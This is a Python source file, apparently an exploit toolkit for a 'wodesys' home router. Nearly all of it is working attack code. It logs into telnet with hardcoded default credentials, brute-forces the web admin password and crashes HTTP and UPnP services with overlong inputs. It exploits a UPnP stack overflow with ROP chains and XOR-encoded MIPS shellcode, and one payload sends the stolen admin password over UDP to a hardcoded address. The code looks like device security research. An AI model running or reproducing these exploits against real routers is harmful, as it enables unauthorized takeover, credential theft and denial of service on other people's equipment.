import base64
import socket
#import telnetlib
import argparse
from cmds import command_dict
import time
import struct
from pwn import *
import os

from rop_payload_generators import *

class ID:
    def __init__(self, module_id, command_id, type, unknown):
        self.id_bytes = []
        self.id_bytes.append(module_id)
        self.id_bytes.append(command_id)
        self.id_bytes.append(type)
        self.id_bytes.append(unknown)

    def to_int(self):
        return int.from_bytes(self.id_bytes, 'big')

    def to_string(self):
        return hex(int.from_bytes(self.id_bytes, 'big')).split('0x')[1]

def create_overflow_request(payload):
    request = b"M-SEARCH * HTTP/1.0\r\n"
    request += b"HOST:239.255.255.250:1900\r\n"
    request += b"ST:uuid:" + payload + b"\r\n"
    request += b"MX:2\r\n"
    request += b"MAN:\"ssdp:discover\"\r\n\r\n"
    return request

# Logs in to the telnet interface
def telnet_login(tn, user, password):
    tn.read_until(b"Login as:")
    tn.write(user.encode() + b"\n")

    tn.read_until(b"Password:")
    tn.write(password.encode() + b"\n")

    print("[+] Logged in\n")

# Send a command to the telnet interface on the router, get first line and flush
def send_telnet_command_and_get_line(tn, command):
    # Send the command
    tn.write(command + b'\n')

    # Read the line
    output = tn.read_until(b'\r\n').decode()

    # Flush remaining output
    tn.read_until(b'>')

    # Close the connection
    return output

# Send a command to the telnet interface on the router, get output until end, flush rest
def send_telnet_command_and_read_until(tn, command, end):
    # Send the command
    tn.write(command + b'\n')

    # Read the output until specified end string
    return tn.read_until(end.encode()).decode()

# Dumps memory in chunks to minimise risk of malloc error
def dump_flash(tn):
    go_to_submenu(tn, 'os')

    print("[+] Starting data read")

    chip_size = 2097152
    chunks = 8

    with open("mem_dump.txt", "w") as dump_file:
        for i in range(chunks):
            start = hex(int((chip_size/chunks) * i))
            size = str(chip_size/chunks)
            cmd_string = f"spi rd {start} {size}\n"

            tn.write(cmd_string.encode('ascii'))

            output = tn.read_until(b'OS>').decode()

            print(f"[*] Read {(i+1)*chip_size/chunks} bytes out of {chip_size}")

            dump_file.write(output.split('\r\n\r\n')[0])
            dump_file.write('\n')

        dump_file.close()

# Converts the incoming txt file to binary file that can be loaded into Ghidra
def convert_txt_to_bin(input_path):
    print(f"[*] Starting conversion of file {input_path}")
    # Open the hexdump file in read mode
    with open(input_path, 'r') as f:
        # Open the output binary file in write mode
        with open('mem_dump.bin', 'wb') as out:
            l = 1

            # Iterate over each line in the hexdump file
            for line in f:
                try:
                    # Split the line into a list of strings using the space character as the delimiter
                    line_data = line.split(' ')

                    # Iterate over each string in the list
                    for data in line_data:
                        byte_list = []
                        for i in range(4):
                            # Convert the string to a hex byte and append it to the list
                            single_byte = bytes.fromhex(data[2*i:2*i+2])

                            byte_list.append(single_byte)
                        
                        # Reverse byte list to correct endian
                        for element in byte_list[::-1]:
                            out.write(element)
                    l += 1
                except Exception:
                    print(f"[-] Conversion failed on line {l} of input file, check it looks valid:\n    {line}")
                    exit(0)

    print(f"[+] Conversion completed successfully, output to mem_dump.bin")

# Goes to the desired submenu in the telnet cmd line
def go_to_submenu(tn, name):
    # Go to top of menu tree
    send_telnet_command_and_get_line(tn, b'cd ..')
    submenu_cmd = f"cd {name}\nls"
    send_telnet_command_and_get_line(tn, submenu_cmd.encode('ascii'))

# Gets all the hidden values that don't appear in the config dump (as well as the ones that do)
def get_all_config(tn):
    go_to_submenu(tn, 'cfg')

    print_with_padding('Decimal ID', False, 12)
    print_with_padding('Hex ID', False, 12)
    print_with_padding('Name', False, 30)
    print("Value")

    # Scan id's for entries not in config
    for i in range(0, 255):
        for j in range(0, 255):
            for k in range(1, 5):
                id = ID(i, j, k, 0)
                response = send_telnet_command_and_get_line(tn, b"get " + id.to_string().encode())

                # Check that a value has been returned
                if (('UNKNOWN' not in response) and ('Not Found' not in response)) and '=' in response:
                    print_with_padding(str(id.to_int()), False, 12)
                    print_with_padding(id.to_string(), False, 12)
                    print_with_padding(response.split('=')[0], False, 30)
                    print(response.split('=')[1].rstrip())
                    #print(f"command_dict['{response.split('=')[0]}'] = {str(id.to_int())}") # For generating dictionary
                    break # Can break as only 1 type for each id

# Prints passed data with specified padding
def print_with_padding(to_print, line_break, space):
    if line_break:
        print(to_print + (space-len(to_print)) * ' ')
    else:
        print(to_print + (space-len(to_print)) * ' ', end='')

# Gets the decimal id of the config value with the passed name
def get_id_by_name(name):
    for cmd_name in command_dict.keys():
        if name in cmd_name:
            return command_dict[cmd_name]

# Send POST request using password as auth, and with the payload
def http_send(ip, password, payload):
    # Construct the authorization
    authorization = f"admin:{password.rstrip()}"
    encoded_authorization = base64.b64encode(authorization.encode("utf-8")).decode("utf-8")

    # Build the request
    request = "POST /do_cmd.htm HTTP/1.1\r\n".encode('utf-8')
    #request += f"If-Modifed-Since: {'a'*380}, 28-{'a'*380}-2023 15:30:00 GMT\r\n".encode('utf-8')
    request += f"Authorization: Basic {encoded_authorization}\r\n".encode('utf-8')
    request += "Content-Type: application/x-www-form-urlencoded\r\n".encode('utf-8')
    request += f"Content-Length: {len(payload)}\r\n".encode('utf-8')
    request += "\r\n".encode('utf-8')
    request += payload
    print(request)
    

    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((ip, 80))

    # Send the request
    s.sendall(request)

    # receive data from the server
    data = s.recv(512) 

    s.close()

    return data

def to_addr(addr):
    return struct.pack("L", addr)

# Try and crack the http admin password with provided wordlist
def crack_password(wordlist):
    # get local machine name
    ip = "192.168.188.1"

    # Start time
    start = time.time()

    # Iterate over the wordlist
    count = 0
    bars = 100

    print(f"[*] Wordlist size: {len(wordlist)}\n")
    print(f"0% {' ' * (bars-8)} 100%")

    bar_width = len(wordlist)/bars
    
    for password in wordlist:
        count += 1

        if int(count % bar_width) == 0:
            print('#', end='', flush=True)

        data = http_send(ip, password, '')

        if b"401" not in data:
            return password.rstrip() + f"\t\t{count/(time.time() - start)} pwd/sec"  


def write_memory(ip, addr, value):
    last_byte = addr & 0xFF
    # Create payload, if the address ends in 0x00, use the alternate gadget to write
    if last_byte == 0x00:
        payload = rop_arbitrary_write_0_in_addr(addr, value)
    else:
        payload = rop_arbitrary_write(addr, value)

    # Build the request
    request = create_overflow_request(payload)

    info(f"Writing {hex(value)} to address {hex(addr)}")
    
    # Create socket and connect
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5)
    s.connect((ip, 1900))

    # Send the request
    s.sendall(request)
    s.close()  

    time.sleep(0.05)

# construct argparse
parser = argparse.ArgumentParser(
    prog='wodesys util',
    description='utils for wodesys router'
)

parser.add_argument('-ip', help='ip address', default='192.168.188.1', type=str)

subparsers = parser.add_subparsers(dest='command')

# construct telnet subparser
telnet_parser = subparsers.add_parser('telnet', help='telnet utils')
telnet_parser.add_argument('-s', '--scan', help='Scan for config values', action='store_true')
telnet_parser.add_argument('-d', '--dump', help='Dump the flash via OS spi command', action='store_true')
telnet_parser.add_argument('-u', '--username', help='Telnet username', default='root')
telnet_parser.add_argument('-p', '--password', help='Telnet password', default='cs2012')
telnet_parser.add_argument('-c', '--convert', help='Convert dumped text file to binary', metavar='file')
telnet_parser.add_argument('-m', '--msg', help='Message to send to telnet', metavar=('module', 'msg'), nargs=2)

# construct http subparser
http_parser = subparsers.add_parser('http', help='HTTP utils')
http_parser.add_argument('-d', '--dictionary', help='Dictionary attack for admin password using passed wordlist')
http_parser.add_argument('-s', '--set', help='Set config values via http request', nargs=3, metavar=('admin_pw', 'name', 'value'))
http_parser.add_argument('-f', '--find', help='Find config value name with substring search', type=str)
http_parser.add_argument('-p', '--payload', help='Payload to send as authenticated http request', type=str, nargs=2, metavar=('admin_pw', 'payload'))
http_parser.add_argument('-r', '--rop', help='Execute the ROP chain', type=str, nargs=1, metavar=('type'))
http_parser.add_argument('-c', '--crash', help='Cause a crash', type=str, nargs=2, metavar=('admin_pw', 'type'), default=('admin', '0'))
http_parser.add_argument('-sh', '--shellcode', help='Execute shellcode', type=str, nargs=1, metavar=('type'))

args = parser.parse_args()

# Use telnet utils
if args.command == 'telnet':
    # Convert input text file to binary
    if args.convert is not None:
        convert_txt_to_bin(args.convert)
        exit(0)
    # Create telnet instance
    tn = telnetlib.Telnet(args.ip)

    # Login with hardcoded creds
    telnet_login(tn, args.username, args.password)

    # Scan for config values and print
    if args.scan:
        get_all_config(tn)

    # Dump the flash with os spi command
    if args.dump:
        dump_flash(tn)

    # Sends a telnet command to the router
    if args.msg:
        go_to_submenu(tn, args.msg[0])
        print(send_telnet_command_and_read_until(tn, args.msg[1].encode(), args.msg[0].upper() + '>'))

    # Close telnet connection when finished
    tn.close()
elif args.command == 'http':
    if args.set is not None:
        try:
            id = int(args.set[1], 16)
        except ValueError:
            id = get_id_by_name(args.set[1])
        payload = f"CMD=SYS&SET0={id}%3D{args.set[2]}"

        print(f"[*] Setting config value with decimal id {id} to {args.set[2]}")
        print(f"[*] HTTP payload : {payload}")

        result = http_send(args.ip, args.set[0], payload)

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("\n[-] Failure, incorrect admin password")
    elif args.dictionary is not None:
        # Read in the wordlist from a file
        with open(args.dictionary, "r") as f:
            wordlist = f.readlines()

        # Call the password cracker function (136 passwords per second)
        password = crack_password(wordlist)

        # Print the password (if it was found)
        if password is not None:
            print(f"\n\n[+] Password found: {password}")
        else:
            print("\n\n[-] Password not found")
    elif args.find is not None:
        print(f"[*] Finding config entiries containing {args.find}\n")
        # Check names of all config names against query
        for name in command_dict.keys():
            # Get index of occurence (if there is one) to print green
            index = name.find(args.find)
            if index >= 0:
                print(name[:index], end='')
                print(f"\u001b[32m{args.find}\u001b[0m", end='')
                print(name[index+len(args.find):])
    elif args.payload is not None:
        print(f"[*] Sending HTTP payload : {args.payload[1]}")

        result = http_send(args.ip, args.payload[0], args.payload[1].encode('utf-8'))

        print("\n[+] Response:\n" + result.decode(), end='')

        if b'200' in result:
            print("[+] Success")
        elif b'401' in result:
            print("[-] Failure, incorrect admin password")
    elif args.crash[1] != '0':
        if args.crash[1] == '1':
            print("Config crash 1")
            # Send the malicious config value (without reloading the config)
            payload = b"CMD=SYS&GO=co_cmd.htm&SET0=71041536%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
            result = http_send(args.ip, args.crash[0], payload)
            print(result)
            print("Remove power now to get the crash on next boot")
        elif args.crash[1] == '2':
            print("Config crash 2 (RT_ADD)")
            # Send the malicious config value (without reloading the config)
            payload = b"CMD=LANGUAGE_TYPE&GO=time.htm&SET0=83952129%3DAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
            result = http_send(args.ip, args.crash[0], payload)
            print(result)

            # Send the RT_ADD command immediately after to triger the overflow
            rt_add_payload = b"CMD=RT_ADD"
            result = http_send(args.ip, args.crash[0], rt_add_payload)
            print(result)
        elif args.crash[1] == '3':
            print("HTTP NPD 1")

            # Build the request
            request = b"POST / HTTP/1.1\r\n"
            request += b"User-Agent: MozillaFirefox\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.ip, 80))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '4':
            print("HTTP NPD 2")

            # Build the request
            request = b"POST / HTTP/1.1\r\n"
            request += b"User-Agent: MozillaQIHU\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((args.ip, 80))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '5':
            print("UPNP crash 1")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:uuid:" + b'a' * 132 + b"\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"

            print(hexdump(request))
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '6':
            print("UPNP crash 2")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-upnp-org:service:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '7':
            print("UPNP crash 3")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-upnp-org:device:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '8':
            print("UPNP crash 4")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-wifialliance-org:service:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
        elif args.crash[1] == '9':
            print("UPNP crash 5")

            # Build the request
            request = b"M-SEARCH * HTTP/1.0\r\n"
            request += b"HOST:239.255.255.250:1900\r\n"
            request += b"ST:urn:schemas-wifialliance-org:device:"
            request += b'a'*200
            request += b":\r\n"
            request += b"MX:2\r\n"
            request += b"MAN:\"ssdp:discover\"\r\n\r\n"
            
            # Create socket and connect
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(5)
            s.connect((args.ip, 1900))

            # Send the request
            s.sendall(request)
            s.close()
    elif args.rop:
        # Build the ROP chain
        if args.rop[0] == '1': # print 'hello' to uart/telnet command line
            chain = rop_uart_hello()
        elif args.rop[0] == '2': # send 'hello' over udp socket to some device
            chain = rop_udp_hello()
        elif args.rop[0] == '3': # print the admin password to the uart using config get function
            chain = rop_uart_admin()
        elif args.rop[0] == '4': # Send a UDP packet containing the admin password (need to make it able to handle arbitrary length with strlen or something)
            chain = rop_udp_admin()
        elif args.rop[0] == 'r': # does a large hex dump at address specified in s0 (basically our way of reading arbitrary memory) - crashes task but not entire router
            chain = rop_hexdump_memory()
        elif args.rop[0] == 'nc': # demonstrates the lack of crash when setting overflowed registers
            chain = rop_demo_non_crash()
        elif args.rop[0] == 'w': # achieving arbitrary write with no crash
            chain = rop_arbitrary_write(0x801d3754, 0x62626262)
        else:
            print("[-] Bad type")
            exit(1)

        print(f"Length used: {len(chain)}")
        print(hexdump(chain))
    
        # Build the request
        request = create_overflow_request(chain)
        
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.connect((args.ip, 1900))

        # Send the request
        s.sendall(request)
        s.close()
    elif args.shellcode:
        context.update(arch='mips', os='linux', bits=32, endian='little')

        decode_shellcode = asm('''
        /* We provided the length of the shellcode (encoded) in s2, so lets decode that */
        xor $s2, $s2, $s3;
        /* Current shellcode address is in s1 (should be okay to pass straight in, basically the first encoded shellcode thing)
        /* s0 will contain the value we are decoding */
        loop:
        /* load the shellcode value to decode */
        lw $s0, 0x1010($s1);
        /* decode the value */
        xor $s0, $s0, $s3;
        /* save value to location it was got from */
        sw $s0, 0x1010($s1)
        /* decrease s2 by 4 so we can check if all decoded, decrease decoding address */
        addiu $s2, $s2, -0x4;
        addiu $s1, $s1, 0x108;
        /* do some branch stuff if s2 is 0 */
        bgtz $s2, loop;
        addiu $s1, $s1, -0x104;
        ''')

        fix_shellcode = asm('''
        /* fix v0 */
        xor $v0, $s3, $s3;
        /* fix s0 (0x802c0404) */
        lui $t0, 0x802c;
        ori $s0, $t0, 0x0404;
        /* fix s1 (0x8025d504) */
        lui $s1, 0x8025;
        ori $s1, $s1, 0x0504;
        /* fix s2 (0x802C5268) */
        ori $s2, $t0, 0x5268;
        /* fix s3 (0x802ab9f4) */
        lui $s3, 0x802a;
        ori $s3, $s3, 0xb9f4;
        /* Fix up stack once shellcode done */
        addiu $sp, $sp, 0xfff;
        j 0x801888e0;
        addiu $sp, $sp, -0xfef;
        ''')

        decoder_addr = 0x8026b7a4
        fixer_addr = decoder_addr + len(decode_shellcode)

        if args.shellcode[0] == '1': # print string to uart
            test_shellcode = asm(f'''
            move $a0, $s2;
            move $a1, $s1;
            jalr $s3;
            nop;
            j {fixer_addr};   /* fix address */
            xor $v0, $s3, $s3;
            ''')

            s0 = 0x802c0404
            s1 = 0x801efa04 # string address
            s2 = 0x801c3f91 # %s address
            s3 = 0x8019a3a0 # printf address
        elif args.shellcode[0] == '2': # send admin password to device listening on network
            test_shellcode = asm(f'''
            lw $a0, ($s1)      /* s1 contains address of 0x1010200 */
            li $v0, 0x800089e4
            jalr $v0           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
            move $a1, $s2      /* s2 contains pwd buffer address */
            jalr $s0           /* len = strlen(pwd_buffer (0x801d3754)) */
            move $a0, $s2      /* s2 contains pwd buffer address */
            move $s0, $v0      /* v0 contains length of password */
            /* create sockaddr stuff and put into t0 */
            li $v0, 0x800f9528
            lw $v0, ($v0)      /* load value of hardcoded_afinet into v0 */
            li $t0, 0x802abf10
            sw $v0, ($s1)      /* save hardcoded_afinet value to address of sockaddr */
            addiu $t0, $s1, 0x4
            li $v0, 0x02bca8c0
            sw $v0, ($t0)      /* save hardcoded IP address to sockaddr + 4 */
            addiu $a0, $zero, 2
            addiu $a1, $zero, 2
            jalr $s3           /* socket(2, 2, 0) - s3 contains address of socket()*/
            move $a2, $zero
            move $a0, $v0      /* v0 contains sockfd_address */
            move $a1, $s2      /* s2 contains pwd buffer address */
            move $a2, $s0      /* s0 contains pwd length */
            move $a3, $zero
            move $t0, $s1      /* s1 contains the address of sockaddr */
            li $v0, 0x80128bc4
            jalr $v0           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
            addiu $t1, $zero, 0x20
            j {fixer_addr}   /* fix address */
            xor $v0, $s3, $s3
            ''')

            s0 = 0x801a717c # config_get address
            s1 = 0x80236c4c # address of 0x1010200
            s2 = 0x801d3754 # address of pwd buffer
            s3 = 0x801293d0 # address of socket function
        elif args.shellcode[0] == '3': # This spins up a thread called 'hello' that prints 'hello' every second
            create_thread_function_addr = 0x8019acb0
            resume_thread_function_addr = 0x8019abec

            # This is the main shellcode that will be executed to spin up the thread
            test_shellcode_p2 = asm(f'''
            /* create_thread(int id, void* thread_function, int priority, char* name) */
            li $a0, 0x10         /* priority */
            /* loading of a1 done later on as need to know the length of this to insert into the shellcode */
            li $a2, 0x0         /* entry_data */
            li $a3, 0x801d3754  /* thread name */
            li $t0, 0x80295680  /* stack base */
            li $t1, 0x800       /* stack size */
            li $t2, 0x802955f8  /* thread handle */
            li $t3, 0x80295500  /* thread itself */
            li $v0, {create_thread_function_addr}
            jalr $v0
            nop
            li $a0, 0x802955f8  /* thread handle */
            lw $a0, ($a0)
            li $v0, {resume_thread_function_addr}
            jalr $v0
            nop
            /* printf("started") */
            li $a0, 0x801ea85f
            li $v0, 0x8019a3a0
            jalr $v0
            nop
            j {fixer_addr}   /* fix address */
            nop''')

            # Calculate the position of the function in memory
            custom_thread_function_location = decoder_addr + len(decode_shellcode) +  len(fix_shellcode) + len(test_shellcode_p2) + 8 # 8 because li is a pseudo-instruction that is actually 2 instructions

            info(f"Custom function location: {hex(custom_thread_function_location)}")

            # os.system('mipsel-unknown-elf-gcc Shellcodes/blackjack.c Shellcodes/Init.S -nostdlib -Wl,-T,Shellcodes/Linker.ld -o Shellcodes/blackjack.elf -Os -ffunction-sections -fdata-sections -Wl,--gc-sections -s')
            # os.system('mipsel-unknown-elf-objcopy -O binary Shellcodes/blackjack.elf Shellcodes/blackjack.bin')

            with open('Shellcodes/blackjack.bin', 'rb') as file:
                custom_function = file.read()
                info(f"Length of custom function is {len(custom_function)}")

            # This is the custom function our thread will be running
            # custom_function = asm('''
            # /* our custom function loop */
            # infinite:
            # /* printf("hello") */
            # li $a0, 0x801d3754
            # li $v0, 0x8019a3a0
            # jalr $v0
            # nop
            # /* sleep(100) */
            # li $a0, 100
            # li $v0, 0x8019abac
            # jalr $v0
            # nop
            # b infinite
            # nop
            # ''')

            # Construct final shellcode
            test_shellcode = asm(f'''
            li $a1, {custom_thread_function_location}  /* custom thread entry point function */
            ''') + test_shellcode_p2 + custom_function

            s0 = 0x802c0404 # config_get address
            s1 = 0x8025d504 # address of 0x1010200
            s2 = 0x802C5268 # address of pwd buffer
            s3 = 0x802ab9f4 # address of socket function
        elif args.shellcode[0] == 't': # use an add to check how viable an area is for executing code
            plus = asm('''
                addiu $s0, $s0, 0x1
                ''')

            for i in range(200):
                test_shellcode += plus

            s0 = 0x801a717c # config_get address
            s1 = 0x80236c4c # address of 0x1010200
            s2 = 0x801d3754 # address of pwd buffer
            s3 = 0x801293d0 # address of socket function
        else:
            print("[-] Bad type")
            exit(1)

        byte_key = -1
        # Determine a good key 
        for i in range(255):
            badchar_detected = False
            if (i not in test_shellcode):
                for j in test_shellcode:
                    val = (j ^ i).to_bytes(1, 'big')
                    if ((val == b'\x0a') or (val == b'\x00')):
                        badchar_detected = True
                        break
                if (badchar_detected == False):        
                    byte_key = i

        if (byte_key == -1):
            printf("NO KEYS AVAILABLE")
            exit(0)
        else:
            print(f"Found XOR key: {hex(byte_key)}")

        xor_key = (byte_key << 24) | (byte_key << 16) | (byte_key << 8) | (byte_key)

        # Write our shellcode to memory with a bunch of overflows
        shellcode_addr = decoder_addr + len(decode_shellcode) + len(fix_shellcode)

        print(f"Decoder address: {hex(decoder_addr)}")
        print(hexdump(decode_shellcode))
        print(f"Fixer address: {hex(fixer_addr)}")
        print(hexdump(decode_shellcode))
        print(f"Shellcode address: {hex(shellcode_addr)}")
        print(hexdump(test_shellcode))
        print(f"Encoded shellcode:")
        encoded_shellcode = b''
        key = xor_key >> 24
        badchar_detected = False
        for i in test_shellcode:
            val = (i ^ key).to_bytes(1, 'big')
            if ((val == b'\x0a') or (val == b'\x00')):
                info(f"Detected badchar :( {val}")
                badchar_detected = True
            encoded_shellcode += val
        print(hexdump(encoded_shellcode))

        if (badchar_detected):
            print("Badchar detected")
            exit(0)

        # Write decoder shellcode
        for i in range(int(len(decode_shellcode) / 4)):
            pos = i * 4
            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))

        # Write fixer shellcode
        for i in range(int(len(fix_shellcode) / 4)):
            pos = i * 4
            write_memory(args.ip, fixer_addr + (i * 4), (fix_shellcode[pos]) | (fix_shellcode[pos + 1] << 8) | (fix_shellcode[pos + 2] << 16) | (fix_shellcode[pos + 3] << 24))
            write_memory(args.ip, fixer_addr + (i * 4), (fix_shellcode[pos]) | (fix_shellcode[pos + 1] << 8) | (fix_shellcode[pos + 2] << 16) | (fix_shellcode[pos + 3] << 24))

        # Write payload
        for i in range(int(len(test_shellcode) / 4)):
            pos = i * 4
            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ xor_key)
            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ xor_key)

        

        #### Now call the decoder shellcode
        payload = b'b' * 132

        payload += p32(0x802c0404) # s0
        payload += p32(shellcode_addr - 0x1010) # s1
        payload += p32(len(test_shellcode) ^ xor_key) # s2
        payload += p32(xor_key) # s3
        payload += p32(decoder_addr) # ra

        # Build the request
        request = create_overflow_request(payload)
        
        # Create socket and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.connect((args.ip, 1900))

        # Send the request
        print("Decoding payload...")
        s.sendall(request)
        s.close()

        #### then call the decoded shellcode
        payload = b'b' * 132

        time.sleep(1) # sleep before sending so the caches get flushed

        payload += p32(s0) # s0 (config_get address)
        payload += p32(s1) # s1 (address of 0x1010200)
        payload += p32(s2) # s2 (address of pwd buffer)
        payload += p32(s3) # s3 (address of socket() function)
        payload += p32(shellcode_addr) # ra
    
        # Build the request
        request = create_overflow_request(payload)
        
        # Create socket to send and connect
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.connect((args.ip, 1900))

        # Send the request
        print("Triggering payload...")
        s.sendall(request)
        s.close()
